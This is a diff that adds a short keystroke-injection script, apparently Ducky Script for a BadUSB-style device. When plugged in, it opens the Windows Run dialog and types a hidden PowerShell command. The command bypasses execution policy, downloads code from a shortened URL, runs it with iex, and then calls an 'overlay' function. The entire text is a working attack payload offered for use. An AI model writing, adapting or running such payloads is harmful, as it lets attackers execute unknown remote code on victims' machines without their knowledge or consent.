@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+STRING powershell -NoP -Ep Bypass "irm "t.ly/IBHlV"|iex;Start-Overlay
+DELAY 300
+ENTER
